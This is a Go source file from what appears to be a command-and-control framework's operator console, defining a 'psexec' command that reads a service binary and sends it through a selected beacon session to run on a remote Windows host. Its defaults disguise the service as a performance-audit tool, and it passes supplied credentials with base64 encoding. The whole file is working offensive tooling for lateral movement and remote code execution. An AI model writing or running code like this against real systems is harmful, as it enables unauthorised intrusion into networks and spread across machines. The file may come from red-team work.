package grumblecli

import (
	"encoding/base64"
	"fmt"
	"os"

	"github.com/desertbit/grumble"
	"google.golang.org/grpc"

	"orsted/client/clientrpc"
)

func SetPsExecCommand(conn grpc.ClientConnInterface) {
	psexecCmd := &grumble.Command{
		Name: "psexec",
		Help: "PsExec a binary on a host",
		Flags: func(f *grumble.Flags) {
			f.String("s", "servicename", "auditorsvc", "Name of the service no spaces")
			f.String("d", "servicedesc", "Service_used_to_audit_performance_of_the_application.", "Description of the service no spaces")
			f.String("b", "binpath", "C:\\Windows\\performance_audit.exe", "Path of the binary onb the remote machine - make sure it is a windows service - no spaces")
			f.String("u", "username", "", "Username for remote authentication (optional)")
			f.String("p", "password", "", "Password for remote authentication (optional)")
			f.String("D", "domain", "", "Domain for remote authentication (optional)")
		},
		Args: func(f *grumble.Args) {
			f.String("hostname", "Target host - ex. 127.0.0.1, machine1")
			f.String("file", "Service file to load")
			f.StringList("args", "Argument of the Assembly")
		},
		Run: func(c *grumble.Context) error {
			if SelectedSession == nil {
				fmt.Println("No session selected. Use interact command to specify session")
				return nil
			}
			var serviceName string = c.Flags.String("servicename")
			var serviceDesc string = c.Flags.String("servicedesc")
			var binPath string = c.Flags.String("binpath")
			var hostname string = c.Args.String("hostname")
			var filename string = c.Args.String("file")
			var username string = c.Flags.String("username")
			var password string = c.Flags.String("password")
			var domain string = c.Flags.String("domain")

			args := ""
			for i := 0; i < len(c.Args.StringList("args")); i++ {
				args += c.Args.StringList("args")[i]
				args += " "
			}

			b, err := os.ReadFile(filename)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}

			usernameField := "_"
			passwordField := "_"
			domainField := "_"
			if username != "" {
				usernameField = username
				if password != "" {
					passwordField = base64.StdEncoding.EncodeToString([]byte(password))
				}
				if domain != "" {
					domainField = domain
				}
			}

			command := fmt.Sprintf("psexec %s %s %s %s %s %s %s %s", serviceName, serviceDesc, binPath, hostname, usernameField, passwordField, domainField, args)
			prettycommand := fmt.Sprintf("psexec %s %s %s", hostname, filename, args)
			if username != "" {
				prettycommand = fmt.Sprintf("psexec -u %s -D %s %s %s %s", username, domainField, hostname, filename, args)
			}
			res, err := clientrpc.AddTaskFunc(conn, SelectedSession.Id, command, b, prettycommand)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			var data [][]string
			data = append(data, []string{
				res.TaskId,
				res.BeacondId,
				res.State,
				string(res.Command),
			})
			prettyPrint(data, []string{"TASKID", "SESSIONID", "STATE", "COMMAND"}, c.App.Stdout())
			return nil
		},
	}

	app.AddCommand(psexecCmd)
}
